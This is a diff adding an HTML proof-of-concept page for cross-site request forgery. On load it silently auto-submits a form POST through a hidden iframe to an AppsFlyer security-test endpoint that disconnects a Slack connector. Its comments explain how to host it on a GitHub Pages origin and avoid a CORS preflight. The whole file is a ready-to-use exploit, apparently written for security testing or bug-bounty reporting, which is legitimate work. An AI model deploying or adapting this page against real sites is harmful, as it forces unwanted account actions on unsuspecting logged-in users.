@@ -1,0 +1,31 @@
+<!doctype html>
+<!-- CSRF PoC: Simple cross-site POST (uses hidden iframe to avoid navigating away).
+     Notes:
+       - Must be hosted on https://<your-gh-username>.github.io/ for a real Origin.
+       - Browser will set: Origin: https://<your-gh-username>.github.io
+       - No JS fetch/XHR is used; this is a plain form POST to avoid preflight. -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF PoC — Simple cross-site POST</title>
+  </head>
+  <body>
+    <h1>CSRF PoC — Simple cross-site POST</h1>
+    <p>This auto-submits a POST to the AppsFlyer test endpoint.</p>
+
+    <form id="csrf" method="POST"
+          action="https://apigateway-security-test.euw1.n8s.appsflyer.engineering/agents-market-place/v1/connectors/slack/disconnect"
+          target="sink">
+      <input type="submit" value="Submit CSRF POST">
+    </form>
+
+    <iframe name="sink" style="display:none;width:0;height:0;border:0;"></iframe>
+
+    <script>
+      // Auto-submit after a brief delay to ensure the page is fully parsed.
+      setTimeout(function () {
+        document.getElementById('csrf').submit();
+      }, 200);
+    </script>
+  </body>
+</html>
